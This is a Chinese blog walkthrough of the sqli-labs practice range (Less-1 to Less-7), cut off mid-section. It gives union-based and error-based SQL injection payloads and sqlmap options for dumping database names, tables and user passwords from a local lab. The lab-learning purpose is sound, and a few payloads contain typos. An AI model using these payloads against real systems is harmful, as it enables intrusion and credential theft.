@@ -1,0 +1,1391 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>sqli-labs靶场练习 | Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="John Doe">
+    
+
+    
+    <meta name="description" content="前言web题目中好多注入啊，学习一波。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs靶场练习">
+<meta property="og:url" content="http://example.com/2019/01/29/%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言web题目中好多注入啊，学习一波。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/30/klynhT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/30/kl6yM4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/30/kl6DRU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/30/klR00J.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/30/klhEk9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/30/klh8kd.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/30/klhB7Q.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/30/kl7JhQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/30/klbkJe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/30/klbTld.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/01/k3sHcF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kjKnVP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/01/k32uIs.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/01/k32GsU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kjiIJI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kjFWcV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kjksKK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kjkBgx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kjkXPs.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kjAUL8.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/06/kvYjCn.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kj1dm9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kj1DFx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kj16SO.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kj1off.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kj3iX4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kj3WgU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kj83xU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kj8qds.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kjGclT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/05/kjJSht.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/06/kvZXVK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/06/kveFqP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/06/kvryRg.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/06/kvyCNV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/06/kv6pKH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/06/kv6HSS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/06/kvfusU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxeqgJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxm8rn.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxnmLR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxn6yj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxuEAP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxMdT1.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxQCX4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxQQnH.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/1551947686682.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxto9A.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxtBtJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxtOHS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxNkHU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxNhrV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxUPGd.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxUiRA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxRrZQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxWPJI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxfFAJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kx534J.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kx5PHS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kx5lEF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kx5uuV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kx5Hvq.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/1551967451498.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxIJIg.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxIazn.png">
+<meta property="og:image" content="c:/Users/17295/AppData/Roaming/Typora/typora-user-images/1551967945603.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxIHFe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/07/kxIqWd.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/11/ACWTIO.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/12/APvuIe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/12/APxEWj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/12/APvF2R.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/12/APxd0K.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/12/APxDte.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/12/APzJUS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/12/AiSJqx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/12/AiSdiD.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/12/Aik3t0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/12/AiVZp6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/12/AiZu80.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/12/AiZU8x.png">
+<meta property="article:published_time" content="2019-01-29T09:05:15.000Z">
+<meta property="article:modified_time" content="2019-03-12T09:15:35.305Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="SQL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/01/30/klynhT.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/tou1.png">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/%02.css">
+<link rel="stylesheet" href="/.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.jpg" alt="Hexo" title="Hexo"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Hexo">Hexo</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:example.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/01/29/靶场/sqli-labs靶场练习/" title="sqli-labs靶场练习" itemprop="url">sqli-labs靶场练习</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="John Doe" target="_blank" itemprop="author">John Doe</a>
+		
+  <p class="article-time">
+    <time datetime="2019-01-29T09:05:15.000Z" itemprop="datePublished"> Published 2019-01-29</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%82%A8%E5%A4%87"><span class="toc-number">2.</span> <span class="toc-text">知识储备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema"><span class="toc-number">2.1.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%B8%80%E4%BA%9B%E7%BB%8F%E5%B8%B8%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">这是一些经常用到的函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-1-to-Less10"><span class="toc-number"></span> <span class="toc-text">Less-1 to Less10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1"><span class="toc-number">1.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">2.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3"><span class="toc-number">3.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4"><span class="toc-number">4.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5"><span class="toc-number">5.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6"><span class="toc-number">6.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7"><span class="toc-number">7.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8"><span class="toc-number">8.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9"><span class="toc-number">9.</span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10"><span class="toc-number">10.</span> <span class="toc-text">Less-10</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-11-to-Less-20"><span class="toc-number"></span> <span class="toc-text">Less-11 to Less-20</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11"><span class="toc-number">1.</span> <span class="toc-text">Less-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12"><span class="toc-number">2.</span> <span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13"><span class="toc-number">3.</span> <span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14"><span class="toc-number">4.</span> <span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15"><span class="toc-number">5.</span> <span class="toc-text">Less-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16"><span class="toc-number">6.</span> <span class="toc-text">Less-16</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F%E4%B8%8E%E5%9B%9E%E6%98%BE%E5%AF%B9%E6%AF%94"><span class="toc-number">6.1.</span> <span class="toc-text">注入方式与回显对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">6.2.</span> <span class="toc-text">分析查询语句</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17"><span class="toc-number">7.</span> <span class="toc-text">Less-17</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B4%BE%E7%94%9F%E8%A1%A8%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">7.1.</span> <span class="toc-text">派生表注入过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E6%B3%A8%E5%85%A5"><span class="toc-number">7.2.</span> <span class="toc-text">updatexml()注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">7.2.1.</span> <span class="toc-text">注入过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18"><span class="toc-number">8.</span> <span class="toc-text">Less-18</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">8.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">8.2.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19"><span class="toc-number">9.</span> <span class="toc-text">Less-19</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">9.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5-1"><span class="toc-number">9.2.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-20"><span class="toc-number">10.</span> <span class="toc-text">Less-20</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">10.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-1"><span class="toc-number">10.2.</span> <span class="toc-text">注入过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-21-to-Less30"><span class="toc-number"></span> <span class="toc-text">Less-21 to Less30</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-21"><span class="toc-number">1.</span> <span class="toc-text">Less-21</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5-2"><span class="toc-number">1.2.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-22"><span class="toc-number">2.</span> <span class="toc-text">Less-22</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-23"><span class="toc-number">3.</span> <span class="toc-text">Less-23</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-number">3.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5-3"><span class="toc-number">3.2.</span> <span class="toc-text">注入</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>web题目中好多注入啊，学习一波。<span id="more"></span></p>
+<h3 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h3><p>我是用的phpstudy，用cmd先打开数据库看看(因为忘了怎么在cmd中打开了，所以试一试)。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\phpstudy\PHPTutorial\MySQL\bin&gt;mysql -u root -p</span><br></pre></td></tr></table></figure>
+<p>然后输入密码即可进入MySQL，</p>
+<h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>在MySQL中，把【INFORMATION_SCHEMA】 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">下面对一些重要的数据字典表做一些说明：</span><br><span class="line"></span><br><span class="line">SCHEMATA表：提供了关于数据库的信息。</span><br><span class="line">TABLES表：给出了关于数据库中的表的信息。</span><br><span class="line">COLUMNS表：给出了表中的列信息。</span><br><span class="line">STATISTICS表：给出了关于表索引的信息。</span><br><span class="line">USER_PRIVILEGES表：给出了关于全程权限的信息。该信息源自mysql.user授权表。</span><br><span class="line">SCHEMA_PRIVILEGES表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。</span><br><span class="line">TABLE_PRIVILEGES表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。</span><br><span class="line">COLUMN_PRIVILEGES表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。</span><br><span class="line">CHARACTER_SETS表：提供了关于可用字符集的信息。</span><br><span class="line">COLLATIONS表：提供了关于各字符集的对照信息。</span><br><span class="line">COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。</span><br><span class="line">TABLE_CONSTRAINTS表：描述了存在约束的表。</span><br><span class="line">KEY_COLUMN_USAGE表：描述了具有约束的键列。</span><br><span class="line">ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。</span><br><span class="line">VIEWS表：给出了关于数据库中的视图的信息。</span><br><span class="line">TRIGGERS表：提供了关于触发程序的信息。</span><br><span class="line">原文链接：https://www.cnblogs.com/hfdp/p/5549384.html</span><br></pre></td></tr></table></figure>
+
+<h4 id="这是一些经常用到的函数"><a href="#这是一些经常用到的函数" class="headerlink" title="这是一些经常用到的函数"></a>这是一些经常用到的函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. version()——MySQL 版本</span><br><span class="line">2. user()——数据库用户名</span><br><span class="line">3. database()——数据库名</span><br><span class="line">4. @@datadir——数据库路径</span><br><span class="line">5. @@version_compile_os——操作系统版本</span><br></pre></td></tr></table></figure>
+<p> 字符串连接函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line">concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line">group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-1-to-Less10"><a href="#Less-1-to-Less10" class="headerlink" title="Less-1 to Less10"></a>Less-1 to Less10</h2><hr>
+<h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>也可以使用<strong>sqlmap</strong></p>
+<p><code>sqlmap -u “http://127.0.0.1/sqlilabs/Less-1/?id=1″ –dbms mysql –level 3 </code></p>
+<p>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）,一些命令。</p>
+<blockquote>
+<p>–is-dba 当前用户权限（是否为root权限）<br>–dbs 所有数据库<br>–current-db 网站当前数据库<br>–users 所有数据库用户<br>–current-user 当前数据库用户<br>–random-agent 构造随机user-agent<br>–passwords 数据库密码<br>–proxy <a target="_blank" rel="noopener" href="http://local:8080/">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
+</blockquote>
+<p>输入**?id=1**会回显出id=1的用户信息，</p>
+<p>尝试输入**?id=1 and 1=1<strong>和</strong>?id=1 and 1=2**都可以正常回显</p>
+<p>输入**?id=1’**，发现报错<br><img src="https://s2.ax1x.com/2019/01/30/klynhT.png" alt="klynhT.png"></p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1
+</code></pre>
+<p>是单引号闭合错误，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1   //回显正常</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;2   //无回显</span><br></pre></td></tr></table></figure>
+
+<p>输入**?id=1’–+**即可正常回显</p>
+<p>接下来用order by来测试表的列数，<br><code>?id=1&#39; order by 3--+</code><br><img src="https://s2.ax1x.com/2019/01/30/kl6yM4.png" alt="kl6yM4.png"><br><code>?id=1&#39; order by 4--+</code><br><img src="https://s2.ax1x.com/2019/01/30/kl6DRU.png" alt="kl6DRU.png"></p>
+<p>可以看出猜测3列时，回显正常，猜测4时，报错，说明这个表有3列。</p>
+<p>接下来使用联合查询union</p>
+<p><code>?id=-1&#39; union select 1.2.3--+</code></p>
+<p>1,2,3 只是为了保证<strong>union</strong>前后两个语句的列数相同，<br>id=-1 则是为了使前一个查询无返回结果从而返回第二个 select 的查询结果,只需要将数字替换为相应的想要查询的信息即可.比如：<br><code>?id =1 union select 1,database(),user()--+</code></p>
+<p>下面使用MySQL自带的一个表information_schema，依次爆库名，爆表名，爆列名，爆数据了</p>
+<p>爆库名<br><code>?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code><br><img src="https://s2.ax1x.com/2019/01/30/klR00J.png" alt="klR00J.png"></p>
+<p>爆表名<br><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code><br><img src="https://s2.ax1x.com/2019/01/30/klhEk9.png" alt="klhEk9.png"></p>
+<p><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+    //可以直接爆表</code></p>
+<p>爆列名<br><code>?id=-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table.name=&#39;users&#39;--+</code><br><img src="https://s2.ax1x.com/2019/01/30/klh8kd.png" alt="klh8kd.png"></p>
+<p>爆数据<br><code>?id=-1&#39; union select 1,username,password from users where id=5--+</code><br><img src="https://s2.ax1x.com/2019/01/30/klhB7Q.png" alt="klhB7Q.png"></p>
+<hr>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>还是用ID查询<br><code>?id=1 and 1=1</code> 正常回显<br><code>?id=1 and 1=2</code> 无回显，不报错<br><code>?id=1&#39;</code> 会报错，原因是单引号出现了奇数次</p>
+<p>整型注入，用order by测试，发现有3列<br><code>?id=1 order by 4--+</code>会报错</p>
+<p>使用union查询<br><code>?id=-1 union select 1,2,3--+</code><br>1,2,3可以任意替换成其他信息，</p>
+<p>如：<code>?id=-1 union select 1,version(),database()--+</code><br><img src="https://s2.ax1x.com/2019/01/30/kl7JhQ.png" alt="kl7JhQ.png"></p>
+<p>然后就可以像Less-1一样了<br><img src="https://s2.ax1x.com/2019/01/30/klbkJe.png" alt="klbkJe.png"></p>
+<p>得到数据库名字为security后<br>爆表<br><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code><br>爆列<br><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code><br>爆数据<br><code>?id=-1 union select 1,username,password from users where id=3--+</code></p>
+<hr>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>输入**?id=1’<strong>，报错：<br><img src="https://s2.ax1x.com/2019/01/30/klbTld.png" alt="klbTld.png"><br>报错提示说</strong>)**不对，可见是单引号后面加括号形成的查询语句</p>
+<p>尝试构造<code>?id=1&#39;)--+</code>,发现可以正常回显。<br>然后就和Less-1一样的步骤。</p>
+<hr>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>输入’,无变化；<br>输入”,报错，<br><img src="https://s2.ax1x.com/2019/02/01/k3sHcF.png" alt="k3sHcF.png"></p>
+<p>可见是双引号和括号的闭合<br>构造**?id=1”)–+**,正常回显<br>payload:<br><code>http://127.0.0.1/sqlilabs/Less-4/?id=-1%22)%20union%20select%201,2,database()--+</code><br>然后就是前面的套路</p>
+<hr>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>更具体的可以看<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8a38d2371b9c">Hyafinthus</a></p>
+<p><code>?id=1</code>和<code>?id=&#39;</code>正常，且无回显；<code>?id=1&#39;</code>报错：字符型双注入。<br>利用双查询注入，可以得出数据库名称</p>
+<p><code>?id=-1&#39; union select 1,count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/05/kjKnVP.png" alt="kjKnVP.png"></p>
+<p>然后，通过group_concat()函数将查到的表名连接并返回报错，得出表名<br><code>?id=-1&#39; union select 1,count(*),concat_ws(&#39;-&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2)) as a from information_schema.tables group by a--+</code><br>即可一步步得到用户信息。</p>
+<p>再来一个报错注入payload<br><code>?id=1&#39; and updatexml(1,concat(0x7e,version(),0x7e),1)%23</code></p>
+<hr>
+<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>输入**?id=1’**，不报错<br><img src="https://s2.ax1x.com/2019/02/01/k32uIs.png" alt="k32uIs.png"></p>
+<p>尝试**?id=1”**,出现报错<br><img src="https://s2.ax1x.com/2019/02/01/k32GsU.png" alt="k32GsU.png"></p>
+<p>可见，是双引号的注入，其余和Less-5一样。</p>
+<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>分别测试<code>?id=1</code>,<code>?id=1&#39;</code>,<code>?id=1&quot;</code>.</p>
+<p>输入单引号测试，出现报错。</p>
+<blockquote>
+<p>You have an error in your SQL syntax</p>
+</blockquote>
+<p>第一、第三条正常，第二条报错：字符型注入</p>
+<p>注意：这里要强调一下，一般在Sql查询语句中，单双引号不能同时存在。即数字型/字符型及单/双引号注入能在这三条语句返回的结果判断出来。</p>
+<p>分析是否存在括号及个数：</p>
+<blockquote>
+<p>?id=1’ and 1=1–+</p>
+</blockquote>
+<p>将查询语句后半段注释掉发现仍报错，说明有括号。依次增加括号个数，直到回显正常.</p>
+<blockquote>
+<p>?id=1’)) and 1=1–+</p>
+</blockquote>
+<p>注意：一般在Sql查询语句中，想要正常查询到信息，只能在最里层有引号，外层全是小括号。即已知注入类型后依次增加括号数必能分析出括号数（存在注入点）。</p>
+<hr>
+<p>这一关是关于文件的一些操作。所以先了解一下关于文件的相关操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file(file_name);读取文件并返回该文件的内容作为一个字符串。</span><br></pre></td></tr></table></figure>
+
+<p>使用的条件</p>
+<blockquote>
